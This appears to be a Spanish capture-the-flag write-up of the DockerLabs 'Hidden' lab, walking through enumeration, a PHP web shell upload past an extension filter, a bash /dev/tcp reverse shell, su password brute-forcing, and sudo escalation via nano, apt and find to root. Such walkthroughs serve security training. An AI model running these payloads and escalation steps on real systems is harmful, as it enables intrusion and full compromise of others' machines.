---
title: DockerLabs - Hidden
summary: "Write-up del laboratorio Hidden de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_hidden"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ nmap -sCV -p80 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://hidden.lab/
Service Info: Host: localhost
```

## análisis

Comenzamos revisando la página principal del servidor web, el cual vemos que nos redirige al dominio `hidden.lab`:

![Desktop View](/20260107142305.webp){: width="972" height="589" .shadow}

Para que nos resuelva correctamente el dominio, debemos modificar el fichero `/etc/passwd` de nuestra máquina, añadiendo la siguiente línea:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ cat /etc/hosts | grep hidden
172.17.0.2      hidden.lab
```

Si volvemos a recargar la página, ahora veremos que se nos cargan correctamente los recursos:

![Desktop View](/20260107142533.webp){: width="972" height="589" .shadow}

Mientras investigamos la página web, dejaremos con **gobuster** una búsqueda por fuerza bruta de recursos disponibles:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ gobuster dir -u "http://hidden.lab" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hidden.lab
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10483]
/mail                 (Status: 301) [Size: 307] [--> http://hidden.lab/mail/]
/menu.html            (Status: 200) [Size: 11846]
/service.html         (Status: 200) [Size: 10926]
/css                  (Status: 301) [Size: 306] [--> http://hidden.lab/css/]
/lib                  (Status: 301) [Size: 306] [--> http://hidden.lab/lib/]
/js                   (Status: 301) [Size: 305] [--> http://hidden.lab/js/]
/about.html           (Status: 200) [Size: 9703]
/LICENSE.txt          (Status: 200) [Size: 1456]
/contact.html         (Status: 200) [Size: 11680]
/img                  (Status: 301) [Size: 306] [--> http://hidden.lab/img/]
/testimonial.html     (Status: 200) [Size: 10335]
/reservation.html     (Status: 200) [Size: 11786]
```

Tras investigar la página web y los recursos obtenidos por **gobuster**, no encontramos nada que nos indique una forma de seguir.

Por lo tanto, intentaremos buscar subdominios asociados a `hidden.lab` empleando nuevamente **gobuster**, el cual rápidamente nos descubre el dominio `dev.hidden.lab`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ gobuster vhost -u 'http://hidden.lab' -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r --ad         
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://hidden.lab
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.hidden.lab Status: 200 [Size: 1653]
Progress: 114442 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

Lo debemos añadir también al fichero `/etc/hosts` para que pueda resolverlo correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ cat /etc/hosts | grep hidden
172.17.0.2      hidden.lab dev.hidden.lab
```

## acceso inicial (www-data)

Al acceder al subdominio vemos que está disponible una funcionalidad que permite subir CVs:

![Desktop View](/20260107144156.webp){: width="972" height="589" .shadow}

Probamos de primeras a subir un script en PHP que nos permita ejecutar comandos de forma remota:

![Desktop View](/20260107144331.webp){: width="972" height="589" .shadow}

Sin embargo, vemos que se valida el tipo de fichero que aportamos a la hora de hacer la subida:

![Desktop View](/20260107144323.webp){: width="972" height="589" .shadow}

Para poder probar esta funcionalidad con mayor facilidad, interceptaremos la petición con **Burp Suite** y la mandaremos al **Repeater**:

![Desktop View](/20260107144735.webp){: width="972" height="589" .shadow}

![Desktop View](/20260107144603.webp){: width="972" height="589" .shadow}

Lo que probaremos en estos casos será:
- Cambiar la extensión del fichero por otra que PHP permita la ejecución del script ([Lista de extensiones válidas](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst))
- Modificar la cabecera `Content-Type`.
- Agregar [magic numbers](https://en.wikipedia.org/wiki/List_of_file_signatures) de ficheros que el servidor acepta.
- Reducir el tamaño del contenido del script.
- Reformular script para evitar bloqueos de palabras clave.

Para el este caso, cambiando la extensión del script es suficiente para que el servidor lo acepte:

![Desktop View](/20260107145000.webp){: width="972" height="589" .shadow}

Aunque el servidor ha subido el script, debemos averiguar donde se encuentra. Para ello, volveremos a emplear **gobuster** para encontrar recursos disponibles en el subdominio:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ gobuster dir -u "http://dev.hidden.lab" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.hidden.lab
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 318] [--> http://dev.hidden.lab/uploads/]
/upload.php           (Status: 200) [Size: 74]
/index.html           (Status: 200) [Size: 1653]
```

Podemos intuir que el recurso `/uploads` es la carpeta donde se suben los ficheros aceptados por el servidor, y al acceder vemos que efectivamente nuestro script se encuentra dentro:

![Desktop View](/20260107144934.webp){: width="700" height="460" .shadow}

Ahora vamos a probar si es posible ejecutar comandos indicando el parámetro `?cmd=<comando a ejecutar>`

```bash
http://dev.hidden.lab/uploads/cmd.phtml?cmd=id
```

![Desktop View](/20260107144849.webp){: width="972" height="589" .shadow}

Ya que tenemos ejecución remota de comandos, procedemos a obtener una reverse shell, poniéndonos en primer lugar en escucha con **nc** y luego ejecutando el siguiente comando (teniendo en cuenta que el `&` está codificado en URL a `%26` para evitar conflictos):

```bash
http://dev.hidden.lab/uploads/cmd.phtml?cmd=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261'
```

Tras ejecutar el comando, deberíamos haber obtenido una consola donde nos habíamos puesto en escucha:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ nc -nlvp 4444  
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 54490
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bae61b258357:/var/www/dev.hidden.lab/uploads$ whoami
whoami
www-data
www-data@bae61b258357:/var/www/dev.hidden.lab/uploads$ hostname -I
hostname -I
172.17.0.2
```

Para poder operar con mayor facilidad, lo que haremos es tratar la TTY:

```bash
www-data@bae61b258357:/var/www/dev.hidden.lab/uploads$ script -c bash /dev/null
<ww/dev.hidden.lab/uploads$ script -c bash /dev/null   
Script started, output log file is '/dev/null'.
www-data@bae61b258357:/var/www/dev.hidden.lab/uploads$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Hidden]
└─$ stty raw -echo;fg   
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@bae61b258357:/var/www/dev.hidden.lab/uploads$ export TERM=xterm
www-data@bae61b258357:/var/www/dev.hidden.lab/uploads$ export SHELL=bash
www-data@bae61b258357:/var/www/dev.hidden.lab/uploads$ stty rows 37 columns 210
```

Listaremos ahora los usuarios del sistema que tengan asignada una consola:

```bash
www-data@bae61b258357:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
cafetero:x:1000:1000::/home/cafetero:/bin/sh
john:x:1001:1001::/home/john:/bin/sh
bobby:x:1002:1002::/home/bobby:/bin/sh
```

## movimiento lateral (cafetero)

Tras revisar múltiples vectores de escalada de privilegios, no encontramos nada, por lo que optamos por tratar de obtener la contraseña de los usuarios empleando fuerza bruta con el siguiente [script](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh).

Lo primero es crear el script y darle permisos en la máquina víctima:

```bash
www-data@bae61b258357:/tmp$ nano bruteforce.sh
Unable to create directory /var/www/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

www-data@bae61b258357:/tmp$ chmod +x bruteforce.sh 
www-data@bae61b258357:/tmp$ ./bruteforce.sh 
Uso: ./bruteforce.sh USUARIO DICCIONARIO
Se deben especificar tanto el nombre de usuario como el archivo de diccionario.
```

Lo siguiente es crear el diccionario que vamos a emplear, que en este caso usaremos las 10000 primeras líneas del diccionario `rockyou.txt`, las cuales copiamos al portapapeles con el siguiente comando (se debe instalar `xclip`, ya que no viene instalado por defecto):

```bash
head $(locate rockyou.txt) -n 10000 | xclip -sel clipboard
```

En la máquina víctima lo pegamos en un nuevo fichero:

```bash
www-data@bae61b258357:/tmp$ nano wordlist.txt
Unable to create directory /var/www/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

www-data@bae61b258357:/tmp$ wc -l wordlist.txt 
10000 wordlist.txt
```

Si ahora ejecutamos el script, veremos que tras unos segundos ya habremos obtenido la contraseña correcta del usuario `cafetero`:

```bash
www-data@bae61b258357:/tmp$ ./bruteforce.sh cafetero wordlist.txt

******************************
*     BruteForce SU         *
******************************

Probando contraseña: 123456
Probando contraseña: 12345
Probando contraseña: 123456789
Probando contraseña: password
Probando contraseña: iloveyou
Probando contraseña: princess
Probando contraseña: 1234567
Probando contraseña: rockyou
...
Contraseña encontrada para el usuario cafetero: ******
```

Procedemos a conectarnos como el usuario `cafetero`:

```bash
www-data@bae61b258357:/tmp$ su cafetero 
Password: 
$ whoami
cafetero
```

## movimiento lateral (john)

Revisando los permisos SUDO que tiene este usuario, veremos que puede ejecutar `/usr/bin/nano` como el usuario `john`:

```bash
$ sudo -l
Matching Defaults entries for cafetero on bae61b258357:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cafetero may run the following commands on bae61b258357:
    (john) NOPASSWD: /usr/bin/nano
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) nos indican que cuando tenemos permisos SUDO para ejecutar `nano` como otro usuario, podemos invocar una consola como dicho usuario:

![Desktop View](/20260107154729.webp){: width="972" height="589" .shadow}

Debemos ejecutar los siguientes comandos (`^` hace referencia a una combinación del botón `Ctrl` con otra tecla):

```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

Tras ejecutar el último comando, habremos obtenido la consola:

```bash
$ id
uid=1001(john) gid=1001(john) groups=1001(john)
$ bash
john@bae61b258357:/home/cafetero$ whoami
john
```

En los permisos SUDO del usuario `john` vemos que puede ejecutar el binario `/usr/bin/apt` como el usuario `bobby`:

```bash
john@bae61b258357:~$ sudo -l
Matching Defaults entries for john on bae61b258357:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User john may run the following commands on bae61b258357:
    (bobby) NOPASSWD: /usr/bin/apt
```

Nuevamente, en [GTFOBins](https://gtfobins.github.io/gtfobins/apt/#sudo) nos indican que podemos aprovecharnos de esta configuración para obtener una consola como el usuario sobre el que tenemos permisos SUDO de varias formas, que en este caso, optaremos por la opción `a)`, la cual se aprovecha de la posibilidad de ejecutar comandos al entrar al modo `less` (modo paginado):

![Desktop View](/20260107155728.webp){: width="972" height="589" .shadow}

De esta manera, ya tendremos una consola como el usuario `bobby`:

```bash
bobby@bae61b258357:/home/john$ whoami
bobby
bobby@bae61b258357:/home/john$
```

Los permisos SUDO del usuario `bobby` revelan que puede ejecutar el binario `/usr/bin/find` como el usuario `root`:

```bash
bobby@bae61b258357:/home/john$ sudo -l
Matching Defaults entries for bobby on bae61b258357:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bobby may run the following commands on bae61b258357:
    (root) NOPASSWD: /usr/bin/find
```

Volvemos a consultar en [GTFOBins](), donde nos indican que podemos invocar una consola como otro usuario si tenemos permisos SUDO sobre el binario `find` ejecutando el siguiente comando:

![Desktop View](/20260107160013.webp){: width="972" height="589" .shadow}

Tras ejecutar el comando que nos indican, comprobamos que efectivamente obtenemos la consola como el usuario `root`:

```bash
bobby@bae61b258357:/home/john$ sudo find . -exec /bin/sh \; -quit
# whoami
root
```

Aquí concluye la resolución de la máquina `Hidden`!


<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>